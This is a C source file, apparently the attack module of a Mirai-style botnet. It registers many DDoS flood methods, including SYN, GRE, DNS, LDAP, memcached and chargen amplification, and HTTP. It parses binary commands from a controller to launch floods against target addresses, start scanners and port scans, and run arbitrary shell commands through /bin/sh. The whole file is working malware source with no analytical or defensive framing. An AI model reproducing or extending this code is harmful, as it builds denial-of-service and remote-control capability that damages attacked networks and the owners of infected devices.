#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>
#include "scan_ports.h"
#include "scanner_control.h"
#include <signal.h>
#include <sys/wait.h>
#include <errno.h>
#include "includes.h"
#include "attack.h"
#include "rand.h"
#include "util.h"

uint8_t methods_len = 0;
struct attack_method **methods = NULL;
int attack_ongoing[ATTACK_CONCURRENT_MAX] = {0};
static BOOL raw_capable = FALSE;
#define ATTACK_WORKERS 4

static BOOL attack_vector_needs_raw(ATTACK_VECTOR v)
{
    switch (v) {
        case ATK_VEC_SYN: case ATK_VEC_ACK: case ATK_VEC_USYN:
        case ATK_VEC_TCPALL: case ATK_VEC_TCPFRAG: case ATK_VEC_ASYN:
        case ATK_VEC_GREIP: case ATK_VEC_ORBITV3: case ATK_VEC_SOCKET:
        case ATK_VEC_NFOLAG: case ATK_VEC_MPTCPGRE:
        case ATK_VEC_GREETH: case ATK_VEC_GRESTACK: case ATK_VEC_UDPX:
            return TRUE;
        default: return FALSE;
    }
}

BOOL attack_raw_capable(void)
{
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (fd >= 0) { close(fd); return TRUE; }
    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd >= 0) { close(fd); return TRUE; }
    return FALSE;
}

BOOL attack_init(void)
{
    int i;
    raw_capable = attack_raw_capable();
    add_attack(ATK_VEC_SYN, (ATTACK_FUNC)attack_method_tcpsyn);
    add_attack(ATK_VEC_ACK, (ATTACK_FUNC)attack_method_tcpack);
    add_attack(ATK_VEC_USYN, (ATTACK_FUNC)attack_method_tcpusyn);
    add_attack(ATK_VEC_TCPALL, (ATTACK_FUNC)attack_method_tcpall);
    add_attack(ATK_VEC_TCPFRAG, (ATTACK_FUNC)attack_method_tcpfrag);
    add_attack(ATK_VEC_ASYN, (ATTACK_FUNC)attack_method_asyn);
    add_attack(ATK_VEC_GAME, (ATTACK_FUNC)attack_method_udpgame);
    add_attack(ATK_VEC_UDPPLAIN, (ATTACK_FUNC)attack_method_udpplain);
    add_attack(ATK_VEC_GREIP, (ATTACK_FUNC)attack_method_greip);
    add_attack(ATK_VEC_STD, (ATTACK_FUNC)attack_method_std);
    add_attack(ATK_VEC_ORBITV3, (ATTACK_FUNC)attack_method_orbitv3);
    add_attack(ATK_VEC_SOCKET, (ATTACK_FUNC)attack_method_socket);
    add_attack(ATK_VEC_NFOLAG, (ATTACK_FUNC)attack_method_nfolag);
    add_attack(ATK_VEC_CUDP, (ATTACK_FUNC)attack_method_cudp);
    add_attack(ATK_VEC_MPTCPGRE, (ATTACK_FUNC)attack_method_mptcpgre);
    add_attack(ATK_VEC_GREETH, (ATTACK_FUNC)attack_method_greeth);
    add_attack(ATK_VEC_GRESTACK, (ATTACK_FUNC)attack_method_grestack);
    add_attack(ATK_VEC_CONNECT, (ATTACK_FUNC)attack_method_connect);
    add_attack(ATK_VEC_DNS, (ATTACK_FUNC)attack_method_dns);
    add_attack(ATK_VEC_LDAP, (ATTACK_FUNC)attack_method_ldap);
    add_attack(ATK_VEC_CHARGEN, (ATTACK_FUNC)attack_method_chargen);
    add_attack(ATK_VEC_MEMCACHED, (ATTACK_FUNC)attack_method_memcached);
    add_attack(ATK_VEC_UDPX, (ATTACK_FUNC)attack_method_udpx);
    add_attack(ATK_VEC_HTTP, (ATTACK_FUNC)attack_app_http);
    return TRUE;
}
void attack_kill_all(void)
{
    int i;
    for (i = 0; i < ATTACK_CONCURRENT_MAX; i++)
    {
        if (attack_ongoing[i] != 0) {
            kill(-attack_ongoing[i], 9);
            waitpid(-attack_ongoing[i], NULL, WNOHANG);
        }
        attack_ongoing[i] = 0;
    }
#ifdef Kwari_SCANNER
     scanner_init();
#endif
}
void attack_parse(char *buf, int len)
{
    int i;
    uint32_t duration;
    ATTACK_VECTOR vector;
    uint8_t targs_len, opts_len;
    struct attack_target *targs = NULL;
    struct attack_option *opts = NULL;
    if (len < sizeof (uint32_t))
        goto cleanup;
    duration = ntohl(*((uint32_t *)buf));
    buf += sizeof (uint32_t);
    len -= sizeof (uint32_t);
    if (len == 0)
        goto cleanup;
    vector = (ATTACK_VECTOR)*buf++;
    len -= sizeof (uint8_t);
    if (vector == ATK_VEC_SCAN_START) {
        scanner_start_all();
        goto cleanup;
    }
    if (vector == ATK_VEC_SCAN_STOP) {
        scanner_stop_all();
        goto cleanup;
    }
    if (vector == ATK_VEC_ATTACK_STOP) {
        attack_kill_all();
        goto cleanup;
    }
    if (len == 0)
        goto cleanup;
    targs_len = (uint8_t)*buf++;
    len -= sizeof (uint8_t);
    if (targs_len == 0)
        goto cleanup;
    if (len < ((sizeof (ipv4_t) + sizeof (uint8_t)) * targs_len))
        goto cleanup;
    targs = calloc(targs_len, sizeof (struct attack_target));
    for (i = 0; i < targs_len; i++)
    {
        targs[i].addr = *((ipv4_t *)buf);
        buf += sizeof (ipv4_t);
        targs[i].netmask = (uint8_t)*buf++;
        len -= (sizeof (ipv4_t) + sizeof (uint8_t));
        targs[i].sock_addr.sin_family = AF_INET;
        targs[i].sock_addr.sin_addr.s_addr = targs[i].addr;
    }
    if (len < sizeof (uint8_t))
        goto cleanup;
    opts_len = (uint8_t)*buf++;
    len -= sizeof (uint8_t);
    if (opts_len > 0)
    {
        opts = calloc(opts_len, sizeof (struct attack_option));
        for (i = 0; i < opts_len; i++)
        {
            uint8_t val_len;
            if (len < sizeof (uint8_t))
                goto cleanup;
            opts[i].key = (uint8_t)*buf++;
            len -= sizeof (uint8_t);
            if (len < sizeof (uint8_t))
                goto cleanup;
            val_len = (uint8_t)*buf++;
            len -= sizeof (uint8_t);
            if (len < val_len)
                goto cleanup;
            opts[i].val = calloc(val_len + 1, sizeof (char));
            util_memcpy(opts[i].val, buf, val_len);
            buf += val_len;
            len -= val_len;
        }
    }
    errno = 0;
    if (vector == ATK_VEC_SCANPORTS && targs_len > 0) {
        char *ports_str = attack_get_opt_str(opts_len, opts, ATK_OPT_PORTS, "80,443,23");
        if (ports_str)
            scan_ports_run(targs[0].addr, ports_str);
        goto cleanup;
    }
    if (vector == ATK_VEC_EXEC) {
        char *cmd = attack_get_opt_str(opts_len, opts, ATK_OPT_CMD, NULL);
        if (cmd && *cmd) {
            if (fork() == 0) {
                execl("/bin/sh", "sh", "-c", cmd, NULL);
                exit(0);
            }
        }
        goto cleanup;
    }
    attack_start(duration, vector, targs_len, targs, opts_len, opts);
    cleanup:
    if (targs != NULL)
        free(targs);
    if (opts != NULL)
        free_opts(opts, opts_len);
}
void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int pid1, pid1b, pid2, i, slot = -1;
    int pipefd[2];

    if (pipe(pipefd) == -1)
        return;

    pid1 = fork();
    if (pid1 == -1) {
        close(pipefd[0]);
        close(pipefd[1]);
        return;
    }
    if (pid1 > 0) {
        close(pipefd[1]);
        if (read(pipefd[0], &pid1b, sizeof(pid1b)) == sizeof(pid1b) && pid1b > 0) {
            for (i = 0; i < ATTACK_CONCURRENT_MAX; i++) {
                if (attack_ongoing[i] != 0 && waitpid(-attack_ongoing[i], NULL, WNOHANG) > 0)
                    attack_ongoing[i] = 0;
            }
            for (i = 0; i < ATTACK_CONCURRENT_MAX && slot < 0; i++)
                if (attack_ongoing[i] == 0)
                    slot = i;
            if (slot >= 0)
                attack_ongoing[slot] = pid1b;
        }
        close(pipefd[0]);
        return;
    }

    close(pipefd[0]);
    pid1b = fork();
    if (pid1b > 0) {
        close(pipefd[1]);
        exit(0);
    }

    close(pipefd[0]);
    pid1b = getpid();
    write(pipefd[1], &pid1b, sizeof(pid1b));
    close(pipefd[1]);

    if (attack_vector_needs_raw(vector) && !raw_capable)
        exit(0);

    {
        int oom_fd = open("/proc/self/oom_score_adj", O_WRONLY);
        if (oom_fd >= 0) {
            const char oom_val[] = "1000";
            write(oom_fd, oom_val, sizeof(oom_val) - 1);
            close(oom_fd);
        }
    }

    setpgid(0, 0);
    pid2 = fork();
    if (pid2 == -1)
        exit(0);
    if (pid2 == 0) {
        sleep(duration);
        killpg(getpgrp(), 9);
        exit(0);
    }
    for (i = 0; i < ATTACK_WORKERS; i++) {
        if (fork() == 0) {
            for (int j = 0; j < methods_len; j++) {
                if (methods[j]->vector == vector) {
                    methods[j]->func(targs_len, targs, opts_len, opts);
                    break;
                }
            }
            exit(0);
        }
    }
    while (wait(NULL) > 0) ;
    exit(0);
}
char *attack_get_opt_str(uint8_t opts_len, struct attack_option *opts, uint8_t opt, char *def)
{
    int i;
    for (i = 0; i < opts_len; i++)
    {
        if (opts[i].key == opt)
            return opts[i].val;
    }
    return def;
}
int attack_get_opt_int(uint8_t opts_len, struct attack_option *opts, uint8_t opt, int def)
{
    char *val = attack_get_opt_str(opts_len, opts, opt, NULL);
    if (val == NULL)
        return def;
    else
        return util_atoi(val, 10);
}
uint32_t attack_get_opt_ip(uint8_t opts_len, struct attack_option *opts, uint8_t opt, uint32_t def)
{
    char *val = attack_get_opt_str(opts_len, opts, opt, NULL);
    if (val == NULL)
        return def;
    else
        return inet_addr(val);
}
static void add_attack(ATTACK_VECTOR vector, ATTACK_FUNC func)
{
    struct attack_method *method = calloc(1, sizeof (struct attack_method));
    method->vector = vector;
    method->func = func;
    methods = realloc(methods, (methods_len + 1) * sizeof (struct attack_method *));
    methods[methods_len++] = method;
}
static void free_opts(struct attack_option *opts, int len)
{
    int i;
    if (opts == NULL)
        return;
    for (i = 0; i < len; i++)
    {
        if (opts[i].val != NULL)
            free(opts[i].val);
    }
    free(opts);
}
